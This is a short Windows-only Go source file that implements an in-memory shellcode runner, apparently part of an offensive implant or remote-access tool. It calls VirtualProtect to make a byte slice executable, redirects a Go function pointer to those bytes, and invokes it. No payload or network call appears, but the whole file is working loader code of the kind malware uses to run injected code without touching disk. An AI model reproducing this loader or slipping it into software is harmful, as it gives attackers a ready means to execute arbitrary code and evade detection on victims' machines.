// +build windows
package main

import (
	"runtime"
	"syscall"
	"unsafe"
)

// VirtualProtect is needed to execute code from the shell
func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	defer FunctionRecovery()
	var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

// Run enables to run code from memory, by copying the code directly.
func Run(sc []byte) {
	defer FunctionRecovery()
	// TODO need a Go safe fork
	// Make a function ptr
	if runtime.GOOS == "windows" {
		f := func() {}

		// Change permissions on f function ptr
		var oldfperms uint32
		if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
			panic("Call to VirtualProtect failed!")
		}

		// Override function ptr
		**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))

		// Change permissions on code string data
		var oldcodeperms uint32
		if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldcodeperms)) {
			panic("Call to VirtualProtect failed!")
		}

		// Call the function ptr it
		f()
	}
}
